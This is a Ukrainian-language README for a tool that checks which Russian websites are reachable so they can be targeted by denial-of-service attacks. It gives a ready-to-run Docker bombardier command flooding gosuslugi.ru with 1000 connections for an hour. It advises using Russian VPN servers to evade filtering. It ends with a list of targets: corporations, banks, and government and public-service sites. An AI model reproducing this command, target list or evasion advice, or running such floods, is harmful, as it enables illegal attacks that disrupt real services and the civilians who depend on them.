# DOS рашистів
Програма для пошуку веб адрес у текстовому файлі і перевірці їх на доступність.
Доступні адреси можуть використовуватись для DOS атак. Успішний HTTP (код >= 200) означає доступний сайт, який можна атакувати. Будь яка помилка означає недоступний сайт, що лежить. Такі сайти атакувати не варто, так як вони вже не функціонують.

## Вимоги
Для роботи необхідний .NET 6 framework.
https://dotnet.microsoft.com/en-us/download/dotnet/6.0

Щоб зкомпілювати програму запустіть в терміналі команду
```
dotnet build .\CheckSitesAvailablity\CheckSitesAvailablity.csproj
```

## Приклад використання
Щоб викнати програму запустіть в терміналі команди:

```powershell
cd .\CheckSitesAvailablity\bin\Debug\net6.0\
.\CheckSitesAvailablity.exe "d:\web_sites.txt"
```

Програма буде шукати адреси веб сайтів, видаляти дублікати і перевіряти на доступність. Доступні сайти можна атакувати. Якщо сайт недоступний, можливо він вже був успішно атакований іншими ентузіастами.

## Інструкція по DOS атаці

Ви можете використовувати ваш комп'ютер як зброю, роблячи ДДОС атаки!

Ось інструкція, як це можна зробити:
- [завантажити Докер](https://www.docker.com/get-started) (можна десктоп)
- і в терміналі написати `docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.ru` де в кінці ви міняєте сайт на один зі списку

Вікон термінала може бути безліч.

Краще атакувати рашистьскі сайти через VPN, використовуючи сервер в росії, тому що рашистські сайті можуть фільтрувати запити з іноземних адрес.

Приклад файлу з веб адресами. Збережіть цей текст у файл `web_sites.txt` і скористайтесь командою наведеною вище.

```
Бизнес-корпорации
Газпром - https://www.gazprom.ru (https://www.gazprom.ru/)/ 
Лукойл - https://lukoil.ru (https://lukoil.ru/)
Магнит - https://magnit.ru (https://magnit.ru/)/
Норильский никель - https://www.nornickel.com (https://www.nornickel.com/)/
Сургетнефтегаз - https://www.surgutneftegas.ru (https://www.surgutneftegas.ru/)/
Татнефть - https://www.tatneft.ru (https://www.tatneft.ru/)/
Евраз - https://www.evraz.com/ru (https://www.evraz.com/ru/)/
НЛМК - https://nlmk.com (https://nlmk.com/)/
Сибур Холинг - https://www.sibur.ru (https://www.sibur.ru/)/
Северсталь - https://www.severstal.com (https://www.severstal.com/)/
Металлоинвест - https://www.metalloinvest.com (https://www.metalloinvest.com/)/
ННК - https://nangs.org (https://nangs.org/)/
Русская медная компания - https://rmk-group.ru/ru (https://rmk-group.ru/ru/)/
ТМК - https://www.tmk-group.ru (https://www.tmk-group.ru/)/
Яндекс - https://ya.ru (https://ya.ru/)/
Polymetal International - https://www.polymetalinternational.com/ru (https://www.polymetalinternational.com/ru/)/
Уралкалий - https://www.uralkali.com/ru (https://www.uralkali.com/ru/)/
Евросибэнерго - https://www.eurosib.ru (https://www.eurosib.ru/)/
ОМК - https://omk.ru (https://omk.ru/)/

Банки
Сбербанк - https://www.sberbank.ru (https://www.sberbank.ru/)
ВТБ - https://www.vtb.ru (https://www.vtb.ru/)/
Газпромбанк - https://www.gazprombank.ru (https://www.gazprombank.ru/)/

Государство
Госуслуги - https://www.gosuslugi.ru (https://www.gosuslugi.ru/)/
Госуслуги Москвы - https://www.mos.ru/uslugi (https://www.mos.ru/uslugi/)/
Президента РФ - http://kremlin.ru (http://kremlin.ru/)/
Правительства РФ - http://government.ru (http://government.ru/)/
Министерство обороны - https://mil.ru (https://mil.ru/)/
Налоговая - https://www.nalog.gov.ru (https://www.nalog.gov.ru/)/
Таможня - https://customs.gov.ru (https://customs.gov.ru/)/
Пенсионный фонд - https://pfr.gov.ru (https://pfr.gov.ru/)/
Роскомнадзор - https://rkn.gov.ru (https://rkn.gov.ru/)/
```